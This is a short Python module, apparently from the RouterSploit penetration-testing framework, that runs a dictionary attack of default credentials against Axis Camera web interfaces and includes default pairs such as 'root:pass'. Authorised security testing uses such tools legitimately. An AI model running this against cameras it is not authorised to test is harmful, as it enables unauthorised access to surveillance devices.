from routersploit.core.exploit import *
from routersploit.modules.creds.generic.http_basic_digest_default import Exploit as HTTPBasicDigestDefault


class Exploit(HTTPBasicDigestDefault):
    __info__ = {
        "name": "Axis Camera Default Web Interface Creds - HTTP Auth",
        "description": "Module performs dictionary attack against Axis Camera Web Interface. "
                       "If valid credentials are found, they are displayed to the user.",
        "authors": (
            "Marcin Bury <marcin[at]threat9.com>",  # routersploit module
        ),
        "devices": (
            "Axis Camera",
        )
    }

    target = OptIP("", "Target IPv4, IPv6 address or file with ip:port (file://)")
    port = OptPort(80, "Target HTTP port")

    threads = OptInteger(1, "Number of threads")
    defaults = OptWordlist("root:pass,root:admin", "User:Pass or file with default credentials (file://)")
